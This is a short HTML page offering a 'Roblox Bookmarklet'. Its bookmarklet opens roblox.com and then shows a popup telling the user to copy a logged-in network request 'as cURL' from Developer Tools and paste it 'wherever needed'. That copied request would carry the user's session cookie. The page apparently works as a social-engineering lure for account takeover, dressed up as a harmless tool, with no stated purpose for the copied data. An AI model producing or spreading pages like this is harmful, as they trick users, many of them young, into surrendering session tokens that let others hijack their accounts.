<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Bookmarklet</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }
    img {
      cursor: grab;
      margin: 20px 0;
    }
    #instructions {
      margin-top: 20px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <h1>Drag to Bookmark Bar</h1>
  <p>Drag the image below to your bookmarks bar. Then click it to open Roblox and start the process.</p>
  <a href="javascript:(function(){ 
      window.location.href = 'https://www.roblox.com'; 
      setTimeout(() => alert('Steps to copy cURL:\n1. Open Developer Tools (F12).\n2. Go to the Network tab.\n3. Right-click a request and choose "Copy as cURL (bash)".\n4. Paste the data wherever needed.'), 3000); 
    })();">
    <img src="https://via.placeholder.com/150x50.png?text=Drag+Me" alt="Drag to Bookmark Bar">
  </a>
  <div id="instructions">
    <h3>How to Use:</h3>
    <ol>
      <li>Drag the image above to your bookmarks bar.</li>
      <li>Click the bookmark in your bookmarks bar.</li>
      <li>Follow the instructions in the popup to complete the process.</li>
    </ol>
  </div>
</body>
</html>
